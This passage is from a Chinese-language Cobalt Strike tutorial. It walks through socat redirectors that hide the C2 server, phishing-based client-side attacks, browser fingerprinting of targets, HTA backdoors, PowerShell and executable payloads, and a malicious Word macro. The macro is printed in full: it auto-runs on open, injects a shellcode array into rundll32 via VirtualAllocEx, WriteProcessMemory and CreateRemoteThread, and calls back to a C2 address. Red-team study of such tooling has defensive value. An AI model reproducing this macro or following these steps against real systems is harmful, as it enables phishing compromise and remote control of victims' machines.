+<p>当上线主机较多的时候，只靠列表的方式去展现，就显得不太直观了，通过CS客户端中的透视图便能很好的展现。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/17.png"></p>
+<h3 id="2-5-重定向器"><a href="#2-5-重定向器" class="headerlink" title="2.5 重定向器"></a>2.5 重定向器</h3><p>重定向器Redirectors是一个位于CS团队服务器和目标网络之间的服务器，这个重定向器通俗的来说就是一个代理工具，或者说端口转发工具，担任CS服务器与目标服务器之间的跳板机角色，整体流量就像下面这样。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标靶机 &lt;--------&gt; 多个并列的重定向器 &lt;------&gt; CS服务器</span><br></pre></td></tr></table></figure>
+
+<p>重定向器在平时的攻击或者防御的过程中起到很重要的作用，主要有以下两点：</p>
+<ul>
+<li>保护自己的CS服务器，避免目标发现自己的真实IP</li>
+<li>提高整体可靠性，因为可以设置多个重定向器，因此如果有个别重定向器停止工作了，整体上系统依旧是可以正常工作的</li>
+</ul>
+<p>Cobalt Strike 的监听器管理功能支持使用重定向器。当你设置一个 HTTP 或 HTTPS Beacon 监听器的时候，简单的指定你的重定向器 IP （在 Host 字段填入）。</p>
+<p>Cobalt Strike 不会验证这个信息。如果你提供的 host 不隶属于当前主机（不是团队服务器的 IP），那么 Cobalt Strike 就假设它是重定向器。一种把服务器转变为重定向器的简单方法是使用 socat。</p>
+<p><strong>创建一个重定向器</strong></p>
+<p>这里就使用自己的内网环境作为测试了，首先理清自己的IP</p>
+<p>CS服务器IP：10.251.0.35</p>
+<p>目标靶机IP：10.251.0.29</p>
+<p>重定向器IP：10.251.0.33 10.251.0.36</p>
+<p>首先，需要先配置重定向器的端口转发，比如这里使用HTTP Beacon，就需要将重定向器的80端口流量全部转发到CS服务器上，使用socat的命令如下：下面是一句 socat 语法，作用是：将80端口上的所有连接转发到位于192.168.12.100的团队服务器的80端口：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:80,fork TCP4:10.251.0.35:80</span><br></pre></td></tr></table></figure>
+
+<p>如果提示没有socat命令，安装一下即可。重定向器设置好之后，就新建一个HTTP Beacon，并把重定向器添加到HTTP Hosts主机列表中</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/18.png"></p>
+<h3 id="2-6-攻击载荷安全特性"><a href="#2-6-攻击载荷安全特性" class="headerlink" title="2.6 攻击载荷安全特性"></a>2.6 攻击载荷安全特性</h3><ul>
+<li><p>在Beacon传输Payload到目标上执行任务时都会先验证团队服务器，以确保Beacon只接受并只运行来自其团队服务器的任务，并且结果也只能发送到其团队服务器。</p>
+</li>
+<li><p>在刚开始设置Beacon Payload时，CS会生成一个团队服务器专有的公私钥对，这个公钥嵌入在Beacon的Payload Stage中。Beacon使用团队服务器的公钥来加密传输的元数据，这个元数据中一般包含传输的进程ID、目标系统IP地址、目标主机名称等信息，这也意味着只有团队服务器才能解密这个元数据。</p>
+</li>
+<li><p>当Beacon从团队服务器下载任务或团队服务器接收Beacon输出时，团队服务器将会使用Beacon生成的会话秘钥来加密任务并解密输出。</p>
+</li>
+<li><p>值得注意的是，Payload Stagers 因为其体积很小，所以没有这些的安全特性。</p>
+</li>
+</ul>
+<h2 id="3-目标攻击"><a href="#3-目标攻击" class="headerlink" title="3.目标攻击"></a>3.目标攻击</h2><h3 id="3-1-客户端攻击"><a href="#3-1-客户端攻击" class="headerlink" title="3.1 客户端攻击"></a>3.1 客户端攻击</h3><p><strong>什么是客户端攻击</strong></p>
+<p>客户端攻击根据教程直译过来就是一种依靠应用程序使用控制端来进行的可视化攻击。</p>
+<p>原文：A client-side attack is an attack against an application used to view attacker controlled content.</p>
+<p><strong>为什么要进行客户端攻击</strong></p>
+<p>随着时代发展到了今天，在有各种WAF、防火墙的情况下，各种漏洞已经很难像过去那么好被利用了，攻击者想绕过防火墙发动攻击也不是那么容易的了。</p>
+<p>而当我们发送一个钓鱼文件到客户端上，再由客户端打开这个文件，最后客户端穿过防火墙回连到我们，此时在客户端上我们就获得了一个立足点foothold。这样的一个过程是相对而言是较为容易的，这也是为什么要进行客户端攻击。</p>
+<p><strong>如何获得客户端上的立足点</strong></p>
+<p>1、尽可能多的了解目标环境，即做好信息收集工作</p>
+<p>2、创建一个虚拟机，使它与目标环境尽可能的一致，比如操作系统、使用的浏览器版本等等都需要保证严格一致</p>
+<p>3、攻击刚刚创建的虚拟机，这会是最好的攻击目标</p>
+<p>4、精心策划攻击方法，达到使目标认为这些攻击行为都是正常行为的效果</p>
+<p>5、将精心制作的钓鱼文件发送给目标，比如钓鱼邮件</p>
+<p>如果这五步都非常细致精心的去准备，那么攻击成功的概率会大幅提升。</p>
+<h3 id="3-2-系统侦察-System-Profiler"><a href="#3-2-系统侦察-System-Profiler" class="headerlink" title="3.2 系统侦察 System Profiler"></a>3.2 系统侦察 System Profiler</h3><p>系统侦察System Profiler是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。</p>
+<p>设置系统侦察需要首先在自己的VPS服务器上运行CS服务端，之后本地客户端进行连接，选择System Profiler功能模块，配置待跳转的URL等信息即可。</p>
+<p>如果勾选了Use Java Applet to get information则可以发现目标的Java版本及内网IP地址，但是这样做被发现的风险就会提高，同时现在浏览器已经默认关闭了java执行权限，因此这个选项的作用也变得不大了。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/19.png"></p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/20.png"></p>
+<p>配置完后，当用户打开配置后的链接，我们可以在三个地方进行观察</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、View --&gt; Applications</span><br><span class="line">2、View --&gt; Web Log</span><br><span class="line">3、Cobalt Strike --&gt; Visualization --&gt; Target Table</span><br></pre></td></tr></table></figure>
+
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/21.png"></p>
+<p>目标用户打开链接时，我们在CS上就能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/22.png"></p>
+<p>注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。</p>
+<h3 id="3-3-用户驱动攻击"><a href="#3-3-用户驱动攻击" class="headerlink" title="3.3 用户驱动攻击"></a>3.3 用户驱动攻击</h3><p>用户驱动攻击User-Driven Attacks需要欺骗用户产生交互才行，但也有许多的优点。</p>
+<p>首先用户驱动攻击不包含恶意攻击代码，所以用户系统上的安全补丁是没用的；其次无论目标使用什么版本的程序，我们都可以创建相应的功能来执行；最后因为用户驱动攻击十分可靠，也使得它很完美。</p>
+<p>当我们采取行动来追踪并需要攻击时，它就像用户本地执行程序一样，CS为我们提供了几个用户驱动攻击的选项，分别如下：</p>
+<p><strong>用户驱动攻击包</strong></p>
+<p>用户驱动攻击包User-Driven Attacks Packages功能打开位置：Attacks –&gt; Packages</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/24.png"></p>
+<p>1、HTML应用</p>
+<p>HTML应用HTML Application生成(executable/VBA/powershell)这3种原理不同的VBScript实现的evil.hta文件。</p>
+<p>2、Microsoft Office 宏文件</p>
+<p>Microsoft Office 宏文件Microsoft Office Document Macros可以生成恶意宏放入office文件，非常经典的攻击手法。</p>
+<p>3、Payload 生成器</p>
+<p>Payload生成器Payload Generator可以生成各种语言版本的Payload，便于进行免杀。</p>
+<p>4、Windows 可执行文件</p>
+<p>Windows 可执行文件Windows Executable 会生成一个Windows可执行文件或DLL文件。默认x86，勾选x64表示包含x64 payload stage生成了artifactX64.exe(17kb) artifactX64.dll(17kb)</p>
+<p>5、Windows 可执行文件（Stageless）</p>
+<p>Windows 可执行文件（Stageless）Windows Executable (Stageless)会生成一个无进程的Windows可执行文件或DLL文件。其中的 Stageless 表示把包含payload在内的”全功能”被控端都放入生成的可执行文件beconX64.exe(313kb) beconX64.dll(313kb) becon.ps1(351kb)</p>
+<h4 id="3-3-1-hta后门"><a href="#3-3-1-hta后门" class="headerlink" title="3.3.1 hta后门"></a>3.3.1 hta后门</h4><p>首先来到Attacks –&gt; Packages –&gt; HTML Application创建一个HTML应用，如果没有创建监听的话，还需要创建一个监听。选择监听器，通过Generate生成。注意：这里需要使用powershell的方式生成hat文件，否则会报错。选择保存的路径即可。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/26.png"></p>
+<p>HTML应用文件生成好后，来到Attacks –&gt; Web Drive-by –&gt; Host File，选择刚才生成的文件。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/27.png"></p>
+<p>最后点击Launch，复制CS创建的链接，在目标主机上打开此链接。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/28.png"></p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/29.png"></p>
+<p>当该文件在目标上运行后，CS客户端上就可以看到回连的会话了。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/30.png"></p>
+<h4 id="3-3-2-宏病毒"><a href="#3-3-2-宏病毒" class="headerlink" title="3.3.2 宏病毒"></a>3.3.2 宏病毒</h4><p>点击Attacks–&gt;Packages–&gt;MS Office Macro。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/31.png"></p>
+<p>然后选择一个监听器，点击Generate，然后点击Copy Macro。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/32.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _</span><br><span class="line">13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _</span><br><span class="line">-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _</span><br><span class="line">-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _</span><br><span class="line">-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,92,17,0,0,83,80,104,87,-119,-97, _</span><br><span class="line">-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _</span><br><span class="line">104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _</span><br><span class="line">-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _</span><br><span class="line">-1,-1,47,53,70,121,104,0,50,80,97,95,22,41,93,72,-68,23,25,-79,21,-58,45,-39,-82,48,-100,-118,-68,73,-49,-85,68,0,-113,-101,120,89,-123,63, _</span><br><span class="line">-29,90,-101,121,69,-115,57,47,114,24,76,106,-65,17,87,127,-26,-5,-31,12,-25,66,95,-58,-6,68,-81,121,-102,-128,-48,-35,-15,-63,-79,-74,-121,-9,-14,-79, _</span><br><span class="line">62,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,53,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _</span><br><span class="line">83,73,69,32,49,48,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,54,46,50,59,32,87,105,110,54,52,59,32,120,54,52,59,32,84,114, _</span><br><span class="line">105,100,101,110,116,47,54,46,48,59,32,65,118,97,110,116,32,66,114,111,119,115,101,114,41,13,10,0,-73,13,45,-79,112,-83,-23,-107,-3,-111,-103,89, _</span><br><span class="line">36,9,-76,-118,112,-67,-22,-128,44,-106,95,108,-37,-118,88,-92,7,106,51,114,-10,-13,47,43,46,90,-127,107,25,-25,-48,-10,41,-92,-2,52,47,46,17,44, _</span><br><span class="line">-32,103,-12,78,-62,4,-125,74,-111,117,55,-95,-86,-80,-26,6,-70,-21,-106,49,-126,37,-124,-10,63,-6,104,-9,-24,-66,-47,-112,75,-32,-71,-91,55,-78,29,0, _</span><br><span class="line">125,2,39,-99,-9,46,-91,24,93,-72,68,-15,-77,-118,44,102,46,88,41,-4,104,67,-97,92,-13,-86,40,-30,0,122,-89,-63,-85,-117,-61,106,-28,75,-78,-85, _</span><br><span class="line">2,-107,80,34,-82,-33,-51,-48,-19,-64,30,23,-94,-112,-62,-30,68,-81,76,58,-41,48,31,-22,-82,-54,-58,71,63,127,-73,-45,-23,64,15,110,9,-94,-9,-38, _</span><br><span class="line">124,-29,64,-104,-11,64,-115,28,-61,87,68,-30,127,1,-95,67,-46,124,98,57,-120,-40,-113,42,-64,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _</span><br><span class="line">104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _</span><br><span class="line">-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,48,46,50,53,49,46,48,46,51,53,0,25,105,-96,-115)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
+
+<p>然后打开word编辑器，点击视图，然后点击宏，随便输入一个宏名，选择宏的位置，点击创建。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/33.png"></p>
+<p>删除掉原来的代码，然后将复制的宏代码粘贴进去。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/34.png"></p>
+<p>然后将文件另存为可启动宏的docm文件。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/35.png"></p>
+<p>然后目标用户开启宏功能，主机就会成功在CS中上线。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/36.png"></p>
+<p>查看宏功能开启情况可以在：文件–&gt;选线–&gt;信任中心–&gt;信任中心设置–&gt;宏设置。</p>
+<p>打开该文件后，目标主机成功上线，进程名为rundll32.exe。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/37.png"></p>
+<h4 id="3-3-3-Payload-Generator"><a href="#3-3-3-Payload-Generator" class="headerlink" title="3.3.3 Payload Generator"></a>3.3.3 Payload Generator</h4><p>这个模块主要用于各种语言版本的shellcode，然后通过其他语言进行编译生成。</p>
+<p>点击Attacks–&gt;Packages–&gt;Payload Generator</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/38.png"></p>
+<p>这里演示一下PowerShell和PowerShell Command的使用方法。</p>
+<p><strong>PowerShell的使用方法</strong></p>
+<p>先通过generate生成一个payload.ps1文件。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/39.png"></p>
+<p>在目标机器上，powershell下执行如下命令，执行如下命令可以执行该脚本。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\payload.ps1</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\payload.ps1</span><br></pre></td></tr></table></figure>
+
+<p><strong>PowerShell Command的使用方法</strong></p>
+<p>先通过generator生成payload.txt文件。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/40.png"></p>
+<p>在目标机器上，powershell下执行该命令。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/41.png"></p>
+<h4 id="3-3-4-Windows-Executable"><a href="#3-3-4-Windows-Executable" class="headerlink" title="3.3.4 Windows Executable"></a>3.3.4 Windows Executable</h4><p>点击Attacks–&gt;Packages–&gt;Windows Executable。选择相应的监听器，若目标操作系统是64位的话，可以选择勾选x64。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/42.png"></p>
+<p>通过Generate生成exe可执行文件，保存到指定路径。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/43.png"></p>
+<p>将生成的文件上传到目标机器并执行，即可成功上线。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/44.png"></p>
+<h4 id="3-3-5-Windows-Executable（S）"><a href="#3-3-5-Windows-Executable（S）" class="headerlink" title="3.3.5 Windows Executable（S）"></a>3.3.5 Windows Executable（S）</h4><p>这里再详细介绍一下Windows Executable与Windows Executable（S）的差别。</p>
+<p>这两个模块直接用于生成可执行的exe文件或dll文件。Windows Executable是生成Stager类型的马，而Windows Executable（S）是生成Stageless类型的马。那Stager和Stageless有什么区别呢？</p>
+<ul>
+<li>Stager是分阶段传送Payload。就是我们生成的Stager马其实是一个小程序，用于从服务器端下载我们真正的shellcode。分阶段在很多时候是很有必要的，因为很多场景对于能加载进内存并成功漏洞利用后执行的数据大小存在严格限制。所以这种时候，我们就不得不利用分阶段传送了。如果不需要分阶段的话，可以在C2的扩展文件里面把 host_stage选项设置为false。</li>
+<li>而Stageless是完整的木马，后续不需要再向服务器端请求shellcode。所以使用这种方法生成的木马会比Stager生成的木马体积要大。但是这种木马有助于避免反溯源，因为如果开启了分阶段传送，任何人都能连接到你的C2服务器请求payload，并分析payload中的配置信息。在CobaltStrike4.0及以后的版本中，后渗透和横向移动绝大部分是使用的Stageless类型的木马。</li>
+</ul>
+<p>点击Attacks-&gt;Packages-&gt;Windows Executable。</p>
+<p>选择对应的监听器和输出格式。</p>
+<p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/45.png"></p>
